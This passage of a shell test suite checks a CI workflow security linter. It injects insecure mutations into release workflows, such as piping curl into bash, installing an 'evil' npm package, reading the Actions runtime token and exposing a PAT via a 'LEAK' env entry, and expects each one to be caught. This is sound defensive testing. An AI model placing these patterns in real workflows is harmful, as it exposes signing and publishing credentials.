		'  SBOM_GENERATOR: docker/buildkit-syft-scanner:1.12.0@sha256:' '  SBOM_GENERATOR: docker/buildkit-syft-scanner:stable-1 #' \
		'SBOM generator image is not pinned by digest ("docker/buildkit-syft-scanner:stable-1")'
	expect_caught 'an SBOM requested through attests with no generator (#680)' mutable "$WORKFLOWS/release-exec.yml" \
		'          sbom: generator=${{ env.SBOM_GENERATOR }}' '          attests: type=sbom' \
		'SBOM generator image is not pinned by digest ("default stable-1")'
	expect_caught 'a global npm install with no version' mutable "$WORKFLOWS/sidecar-release.yml" \
		'npm install -g "npm@${NPM_VERSION}"' 'npm install -g npm'
	expect_caught 'a global npm install of a range' mutable "$WORKFLOWS/sidecar-release.yml" \
		'npm install -g "npm@${NPM_VERSION}"' 'npm i -g npm@^12'
	expect_caught 'the npm pin itself loosened to a major' mutable "$WORKFLOWS/sidecar-release.yml" \
		'  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "12"'
	expect_caught 'a Bun range in the job that can tag a release' mutable "$WORKFLOWS/release.yml" \
		'bun-version: "1.4.2"' 'bun-version: "1.x"'
	expect_caught 'a download piped into a shell' mutable "$WORKFLOWS/release.yml" \
		'      - name: Compute new version' $'      - run: curl -fsSL https://bun.sh/install | bash\n      - name: Compute new version'
	expect_caught 'Bun taken from a version file' mutable "$WORKFLOWS/release.yml" \
		'bun-version: "1.4.2"' 'bun-version-file: package.json'
	# go-version-file is accepted only while go.mod names an exact version.
	mkdir -p "${WORK}/gomod/sidecar"
	sed 's/^go \([0-9]*\.[0-9]*\)\.[0-9]*$/go \1/' "${HERE}/../../sidecar/go.mod" >"${WORK}/gomod/sidecar/go.mod"
	if grep -qE '^go [0-9]+\.[0-9]+$' "${WORK}/gomod/sidecar/go.mod" &&
		[ -n "$(REPO_DIR="${WORK}/gomod" check mutable "$WORKFLOWS/sidecar-release.yml")" ]; then
		ok "reports: a two-part go directive behind go-version-file"
	else
		no "reports: a two-part go directive behind go-version-file"
	fi
	expect_caught 'Bun restored from the Actions cache' mutable "$WORKFLOWS/release.yml" \
		$'          no-cache: true\n' ''
	expect_caught 'Go modules and build output restored from the Actions cache' mutable "$WORKFLOWS/sidecar-release.yml" \
		$'          cache: false\n' ''
}
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'secrets: inherit back on the sidecar call' narrow "$WORKFLOWS/release-exec.yml" \
		$'    secrets:\n      APPLE_CERT_P12: ${{ secrets.APPLE_CERT_P12 }}\n' $'    secrets: inherit\n    x-was:\n      APPLE_CERT_P12: ${{ secrets.APPLE_CERT_P12 }}\n'
	expect_caught 'a declared signing secret the caller does not pass (signing would silently skip)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      ASC_API_KEY_P8: ${{ secrets.ASC_API_KEY_P8 }}\n' ''
	expect_caught 'id-token back on a sidecar build leg' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      contents: read\n    outputs:\n      sha256: ${{ steps.digest.outputs.sha256 }}\n    env: &build-sidecar-leg-env' $'      contents: read\n      id-token: write\n    outputs:\n      sha256: ${{ steps.digest.outputs.sha256 }}\n    env: &build-sidecar-leg-env' \
		'a matrix job holding id-token'
	expect_caught 'the brain build back in the job that holds id-token' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: bun run prepublishOnly\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'a token left in .git/config by the release job' narrow "$WORKFLOWS/release-exec.yml" \
		$'          fetch-depth: 0\n          persist-credentials: false\n' $'          fetch-depth: 0\n'
	expect_caught 'no secrets passed to the sidecar call at all (signing would silently skip)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    secrets:\n      APPLE_CERT_P12: ${{ secrets.APPLE_CERT_P12 }}\n      APPLE_CERT_PASSWORD: ${{ secrets.APPLE_CERT_PASSWORD }}\n      ASC_KEY_ID: ${{ secrets.ASC_KEY_ID }}\n      ASC_ISSUER_ID: ${{ secrets.ASC_ISSUER_ID }}\n      ASC_API_KEY_P8: ${{ secrets.ASC_API_KEY_P8 }}\n' ''
	expect_caught 'a checkout back in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - name: Verify the tarball' \
		'uses actions/checkout@'
	expect_caught 'a directory npm publish (runs lifecycle scripts)' narrow "$WORKFLOWS/release-exec.yml" \
		'npm publish "${RUNNER_TEMP}/brain-pack/${TARBALL}" --access public' 'npm publish --access public'
	expect_caught 'the digest check removed before the publish' narrow "$WORKFLOWS/release-exec.yml" \
		'brain-pack/${TARBALL}" | sha256sum -c -' 'brain-pack/${TARBALL}" | cat'
	expect_caught 'another global package installed in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: npm install -g evil@1.0.0\n      - name: Verify the tarball' \
		'installs something other than npm'
	expect_caught 'a node script run in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: node scripts/x.js\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'the Windows build back in the job that signs with id-token' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: ../.github/scripts/build-sidecar.sh\n      - name: Windows signing readiness'
	expect_caught 'a global install with the flag after the package' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: npm install evil@1.0.0 -g\n      - name: Verify the tarball' \
		'installs something other than npm'
	expect_caught 'npm test in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: npm test\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'a command behind sudo in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: sudo node x.js\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'a non-shell step in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - shell: node {0}\n        run: console.log(1)\n      - name: Verify the tarball' \
		'step with shell:'
	expect_caught 'go test in the job that signs with id-token' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: go test ./...\n      - name: Windows signing readiness'
	expect_caught 'a local action in the job that signs with id-token' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - uses: ./.github/actions/bun-setup\n      - name: Windows signing readiness'
	expect_caught 'the Google credentials file left in the workspace' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          create_credentials_file: false\n' ''
	expect_caught 'node behind an if, in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: if node x.js; then true; fi\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'node behind an assignment and a path, in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: X=1 /usr/bin/node evil.js\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'a digest check allowed to fail (#781 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Verify the binary\n' $'      - name: Verify the binary\n        continue-on-error: true\n' \
		'continue-on-error on "Verify the binary"'
	expect_caught 'a digest check that hashes the file against itself, the digest left unread (#781 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::build-sidecar-windows reported no digest"; exit 1; }\n          in="${RUNNER_TEMP}/unsigned"\n          if [ "$(find "$in" -mindepth 1 -print)" != "${in}/${SIDECAR_BIN}.exe" ] || [ -L "${in}/${SIDECAR_BIN}.exe" ] || [ ! -f "${in}/${SIDECAR_BIN}.exe" ]; then\n            echo "::error::the unsigned-win32-x64 artifact is not exactly one file, ${SIDECAR_BIN}.exe"\n            exit 1\n          fi\n          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' \
		$'          in="${RUNNER_TEMP}/unsigned"\n          sha256sum "${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' \
		'has a needs.<job>.outputs digest in env that its check never reads'
	expect_caught 'a digest check whose failure is excused (#781 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' 'echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c - || true' \
		'failure excused'
	expect_caught 'a digest check excused with || echo (#781 re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' 'echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c - || echo ignored' \
		'failure excused'
	expect_caught 'a digest check wrapped in if ! (#781 re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' '          if ! echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -; then echo ignored; fi' \
		'failure excused'
	expect_caught 'a digest check after set +e (#781 re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' $'          set +e\n          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -\n          true' \
		'failure excused'
	expect_caught 'a digest check excused on the next line (#781 re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' $'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c - ||\n            true' \
		'failure excused'
	expect_caught 'a digest check piped into cat, without pipefail (#781 second re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' '          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c - | cat' \
		'failure excused'
	expect_caught 'a digest check swallowed by a command substitution (#781 second re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' '          echo "$(echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -)"' \
		'failure excused'
	expect_caught 'a digest check sent to the background (#781 second re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' '          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c - &' \
		'failure excused'
	expect_caught 'pipefail switched off before the digest check (#781 second re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' $'          set +o pipefail\n          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' \
		'failure excused'
	expect_caught 'the download action spelled in another case, used before its check (#781 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: unsigned-win32-x64\n          path: ${{ runner.temp }}/unsigned\n' \
		$'      - uses: Actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: unsigned-win32-x64\n          path: ${{ runner.temp }}/unsigned\n      - run: ls sidecar\n' \
		'is not followed at once by a sha256sum -c'
	expect_caught 'an artifact fetched with gh run download in a signing job (#781 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: gh run download "$GITHUB_RUN_ID" -n unsigned-win32-x64\n      - name: Windows signing readiness' \
		'fetches artifacts outside actions/download-artifact'
	expect_caught 'a package install inside a brace group (#817 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: |\n          { sudo apt-get install -y osslsigncode; }\n      - name: Windows signing readiness' \
		'installs OS packages in a job holding id-token'
	expect_caught 'a package install behind sudo -u (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Windows signing readiness' $'      - run: |\n          sudo -u root apt-get install -y osslsigncode\n      - name: Windows signing readiness' \
		'installs OS packages in a job holding id-token'
	expect_caught 'a package install after a quoted hash, which is not a comment (#817 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: |\n          echo "step #1"; sudo apt-get install -y osslsigncode\n      - name: Windows signing readiness' \
		'installs OS packages in a job holding id-token'
	expect_caught 'pip run as a python module in the npm publish job (#817 review)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Ensure npm supports Trusted Publishing' $'      - run: |\n          python3 -m pip install --user something\n      - name: Ensure npm supports Trusted Publishing' \
		'installs OS packages in a job holding id-token'
	expect_caught 'a package install handed to a shell as text (#817 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Ensure npm supports Trusted Publishing' $'      - run: |\n          bash -c "apt-get install -y jq"\n      - name: Ensure npm supports Trusted Publishing' \
		'runs shell text in a job holding id-token'
	expect_caught 'a package-install action in a signing job (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Windows signing readiness' $'      - uses: awalsh128/cache-apt-pkgs-action@2c09a5e66da6c8016428a2172bd76e5e4f14bb17\n        with:\n          packages: osslsigncode\n      - name: Windows signing readiness' \
		'uses awalsh128/cache-apt-pkgs-action@2c09a5e66da6c8016428a2172bd76e5e4f14bb17 in a job holding id-token'
	expect_caught 'the sidecar signing input extracted over the checkout again (#817 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          name: unsigned-win32-x64\n          path: ${{ runner.temp }}/unsigned\n' $'          name: unsigned-win32-x64\n          path: sidecar\n' \
		'sign-sidecar-windows: downloads "unsigned-win32-x64" into "sidecar", over the checkout'
	expect_caught 'the installer signing input downloaded to the default path, the workspace (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          name: unsigned-installer-win32-x64\n          path: ${{ runner.temp }}/unsigned\n' $'          name: unsigned-installer-win32-x64\n' \
		'sign-windows: downloads "unsigned-installer-win32-x64" into "the workspace"'
	expect_caught 'the installer signature check reading its input from inside the checkout (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          name: installer-win32-x64\n          path: ${{ runner.temp }}/signed\n' $'          name: installer-win32-x64\n          path: ./sidecar/in\n' \
		'verify-windows: downloads "installer-win32-x64" into "./sidecar/in"'
	expect_caught 'a download that climbs out of runner.temp back into the checkout (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          name: installer-win32-x64\n          path: ${{ runner.temp }}/signed\n' $'          name: installer-win32-x64\n          path: ${{ runner.temp }}/../work/jarvis/jarvis/sidecar\n' \
		'verify-windows: downloads "installer-win32-x64" into "${{ runner.temp }}/../work'
	expect_caught 'a download into the home directory (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          name: installer-win32-x64\n          path: ${{ runner.temp }}/signed\n' $'          name: installer-win32-x64\n          path: ~/in\n' \
		'verify-windows: downloads "installer-win32-x64" into "~/in"'
	expect_caught 'a release-path download into the workspace root (#817 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'          path: artifacts\n          pattern: sidecar-*\n' $'          path: .\n          pattern: sidecar-*\n' \
		'github-release: downloads "sidecar-*" into "."'
	expect_caught 'osslsigncode installed from apt back in the sidecar signing job (#817)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - name: Install osslsigncode\n        run: |\n          sudo apt-get update\n          sudo apt-get install -y osslsigncode\n      - name: Windows signing readiness' \
		'installs OS packages in a job holding id-token'
	expect_caught 'osslsigncode installed from apt back in the installer signing job (#817)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Windows signing readiness' $'      - run: sudo apt install -y osslsigncode\n      - name: Windows signing readiness' \
		'installs OS packages in a job holding id-token'
	expect_caught 'a package install behind env and an assignment, in the npm publish job (#817)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Ensure npm supports Trusted Publishing' $'      - run: env DEBIAN_FRONTEND=noninteractive dpkg -i x.deb\n      - name: Ensure npm supports Trusted Publishing' \
		'installs OS packages in a job holding id-token'
	expect_caught 'a pip install in the brain npm publish job (#817)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Ensure npm supports Trusted Publishing' $'      - run: pip3 install --user something\n      - name: Ensure npm supports Trusted Publishing' \
		'installs OS packages in a job holding id-token'
	expect_caught 'the runtime artifact service called directly from a signing job (#820)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: |\n          curl -fsS -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts"\n      - name: Windows signing readiness' \
		'reads the Actions runtime artifact API'
	expect_caught 'the runtime token handed to a step through env (#820)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          ALLOW_UNSIGNED_WINDOWS: ${{ vars.ALLOW_UNSIGNED_WINDOWS }}\n        run: |\n' \
		$'          ALLOW_UNSIGNED_WINDOWS: ${{ vars.ALLOW_UNSIGNED_WINDOWS }}\n          URL: ${{ env.ACTIONS_RESULTS_URL }}\n        run: |\n' \
		'reads the Actions runtime artifact API'
	expect_caught 'the runtime URL in a signing job env (#820)' narrow "$WORKFLOWS/installer-release.yml" \
		$'    steps:\n      # For scripts/sign-windows.sh and the committed certificate chain.' \
		$'    env:\n      R: ${{ env.ACTIONS_RUNTIME_URL }}\n    steps:\n      # For scripts/sign-windows.sh and the committed certificate chain.' \
		'job env reads the Actions runtime artifact API'
	expect_caught 'github-script reading the runtime token, no artifact word in sight (#820)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd\n        with:\n          script: return process.env.ACTIONS_RUNTIME_TOKEN\n      - name: Verify the tarball' \
		'reads the Actions runtime artifact API'
	expect_caught 'a third-party artifact download action in the npm publish job (#820)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - uses: dawidd6/action-download-artifact@ac66b43f0e6a346234dd65d4d0c8fbb31cb316e5\n        with:\n          name: brain-tarball\n      - name: Verify the tarball' \
		'fetches artifacts through dawidd6/action-download-artifact'
	expect_caught 'an action that exports the runtime token to later steps, in a signing job (#820)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Windows signing readiness' $'      - uses: crazy-max/ghaction-github-runtime@3cb05d89e1f492524af3d41a1c98c83bc3025124\n      - name: Windows signing readiness' \
		'fetches artifacts through crazy-max/ghaction-github-runtime'
	expect_caught 'publish-sidecar using the artifacts before checking them (#781)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Verify sidecar artifacts' $'      - run: ls artifacts\n      - name: Verify sidecar artifacts' \
		'is not followed at once by a sha256sum -c'
	expect_caught 'the signer checking the binary against something other than a job output (#781)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          SHA256: ${{ needs.build-sidecar-windows.outputs.sha256 }}' '          SHA256: ${{ vars.EXPECTED_SHA256 }}' \
		'is checked against no needs.<job>.outputs digest'
	expect_caught 'the release attaching sidecar binaries whose check can be switched off alone (#781)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Verify sidecar binaries\n        if: needs.publish-sidecar.outputs.released == \'true\'' $'      - name: Verify sidecar binaries\n        if: false' \
		'is checked under a different condition'
	# #952 follow-up: publish-sidecar downloads its five artifacts by name,
	# one step each, checked by the one step after the run.
	expect_caught 'a step run inside the run of sidecar downloads, before the check (#952)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          path: artifacts/sidecar-linux-arm64\n\n      - name: Download sidecar-darwin-arm64\n' $'          path: artifacts/sidecar-linux-arm64\n\n      - run: ls artifacts\n\n      - name: Download sidecar-darwin-arm64\n' \
		'download "sidecar-linux-x64" is not followed at once by a sha256sum -c'
	expect_caught 'one download of the run under a condition of its own (#952)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Download sidecar-darwin-arm64\n' $'      - name: Download sidecar-darwin-arm64\n        if: always()\n' \
		'download "sidecar-darwin-arm64" is checked under a different condition'
	expect_caught 'one download of the run allowed to fail (#952)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Download sidecar-darwin-x64\n' $'      - name: Download sidecar-darwin-x64\n        continue-on-error: true\n' \
		'download "sidecar-darwin-x64": continue-on-error on'
	expect_caught 'a download slipped in front of the npm publish job tarball download, which its check never looks at (#952 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'          name: brain-tarball\n          path: ${{ runner.temp }}/brain-pack\n' $'          name: brain-tarball\n          path: ${{ runner.temp }}/brain-pack\n      - uses: actions/download-artifact@0000000000000000000000000000000000000000 # v0\n        with:\n          name: other\n          path: ${{ runner.temp }}/other\n' \
		'download "other" sits in a run of downloads'
	expect_caught 'a sixth download in the sidecar run that the check never names (#952 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          path: artifacts/sidecar-win32-x64\n' $'          path: artifacts/sidecar-win32-x64\n      - uses: actions/download-artifact@0000000000000000000000000000000000000000 # v0\n        with:\n          name: extra\n          path: extra\n' \
		'download "extra" sits in a run of downloads'
	expect_caught 'a sidecar download in the run by glob, not by name (#952 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          name: sidecar-linux-x64\n          path: artifacts/sidecar-linux-x64\n' $'          pattern: sidecar-*\n          path: artifacts\n' \
		'download "sidecar-*" sits in a run of downloads'
	expect_caught 'the npm publish job doing something between the tarball download and its check (#781)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: ls\n      - name: Verify the tarball' \
		'is not followed at once by a sha256sum -c'
	expect_caught 'the installer build back in the job that signs with id-token (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Windows signing readiness' $'      - run: go build -o Jarvis-Setup.exe ./installer/\n      - name: Windows signing readiness' \
		'builds in a job holding id-token'
	expect_caught 'id-token back on the installer build job (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		$'    permissions:\n      contents: read\n    outputs:' $'    permissions:\n      contents: read\n      id-token: write\n    outputs:' \
		'build-windows: builds in a job holding id-token'
	expect_caught 'the installer Google credentials file left in the workspace (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          create_credentials_file: false\n' '' \
		'create_credentials_file is not false'
	expect_caught 'an installer checkout leaving its token in .git/config (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		$'        with:\n          persist-credentials: false\n      - id: v' $'      - id: v' \
		'resolve: checkout leaves the token'
	expect_caught 'the installer signer using the build before checking it (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		$'      - name: Verify the installer\n' $'      - run: ls sidecar\n      - name: Verify the installer\n' \
		'sign-windows: download "unsigned-installer-win32-x64" is not followed at once'
	expect_caught 'the installer release publishing artifacts it has not checked (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Verify the installers' $'      - run: ls artifacts\n      - name: Verify the installers' \
		'publish: download "installer-*" is not followed at once'
	expect_caught 'a registry login on a dry run' narrow "$WORKFLOWS/release-exec.yml" \
		$'        if: env.DRY_RUN != \'true\'\n        uses: docker/login-action@' $'        uses: docker/login-action@'
}
expect_caught 'an unfrozen install in the catalog sync' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'run: bun install --frozen-lockfile' 'run: bun install'
expect_caught 'a write scope on the job that runs the catalog generator' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'    permissions:\n      contents: read\n    outputs:' $'    permissions:\n      contents: write\n    outputs:'
expect_caught 'the catalog generator run from the job holding the write token' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: bun run scripts/sync-pieces-catalog.ts\n      - name: Put the generated files in place'
expect_caught 'a local action that installs dependencies, used from the job holding the write token' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - uses: ./.github/actions/bun-setup\n      - name: Put the generated files in place'
expect_caught 'the catalog generator reached through its package.json alias, from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: bun run sync:pieces\n      - name: Put the generated files in place'
expect_caught 'the generator alias after another command, with a flag, from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: bun --version && bun run --silent sync:pieces\n      - name: Put the generated files in place'
expect_caught 'the generator alias quoted, behind a flag with a value, from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: npm --prefix . run "sync:pieces"\n      - name: Put the generated files in place'
expect_caught 'the generator alias with a flag on both sides, from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: bun run --silent sync:pieces --x\n      - name: Put the generated files in place'
expect_caught 'an install handed to a shell, from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: bash -c "bun install --frozen-lockfile"\n      - name: Put the generated files in place'
expect_caught 'an install that turns the frozen lockfile off' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'run: bun install --frozen-lockfile' 'run: bun install --frozen-lockfile=false'
expect_caught 'the catalog write job leaving its token in .git/config (#821)' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'GH_TOKEN from its step env.\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n' \
	$'GH_TOKEN from its step env.\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: true\n' \
	'publish: checkout leaves the write token in .git/config'
expect_caught 'the catalog write job checking out with the default, which persists (#821)' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'GH_TOKEN from its step env.\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n' \
	$'GH_TOKEN from its step env.\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n' \
	'publish: checkout leaves the write token in .git/config'
expect_caught 'a job reading a PAT, with a read-only GITHUB_TOKEN, installing dependencies' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'    permissions:\n      contents: read\n      # The held-verified-bumps tracking issue.\n      issues: write\n    steps:\n' \
	$'    permissions:\n      contents: read\n    steps:\n      - run: bun install --frozen-lockfile\n' \
	'installs dependencies in a job holding a secret other than GITHUB_TOKEN'
expect_caught 'a PAT in workflow-level env, reaching the jobs that install' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'env:\n  # Pinned, matching test.yml' $'env:\n  LEAK: ${{ secrets.RELEASE_PR_TOKEN }}\n  # Pinned, matching test.yml' \
	'inspect: step 2: installs dependencies in a job holding a secret other than GITHUB_TOKEN'
expect_caught 'the catalog tests run from the write job, on the generated files' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - run: bun test src/workflows/pieces-library/catalog.test.ts\n      - name: Update or close the review issue' \
	'runs JavaScript in a job holding'
expect_caught 'node run from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - run: cd src && node -e 1\n      - name: Update or close the review issue' \
	'runs JavaScript in a job holding'
expect_caught 'the PAT handed to a later step' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          HELD_COUNT:' '          GH_TOKEN: ${{ secrets.RELEASE_PR_TOKEN }}
          HELD_COUNT:' \
	'secrets.RELEASE_PR_TOKEN is read 3 times'
expect_caught 'a refusal whose exit 1 is only a comment' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'on this repository."\n            exit 1\n' $'on this repository."\n            : # exit 1 later\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'bun as the step shell in the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - shell: bun {0}\n        run: console.log(1)\n      - name: Update or close the review issue' \
	'runs JavaScript (as its shell)'
expect_caught 'github-script in the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b\n        with:\n          script: return 1\n      - name: Update or close the review issue' \
	'runs JavaScript (github-script)'
expect_caught 'node by absolute path in the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - run: /usr/bin/node -e 1\n      - name: Update or close the review issue' \
	'runs JavaScript in a job holding'
expect_caught 'a TypeScript file run by its shebang in the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - run: ./scripts/render-review-issue.ts x\n      - name: Update or close the review issue' \
	'runs JavaScript in a job holding'
expect_caught 'the PAT read by bracket in a later step' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          HELD_COUNT:' $'          GH_TOKEN: ${{ secrets[\'RELEASE_PR_TOKEN\'] }}\n          HELD_COUNT:' \
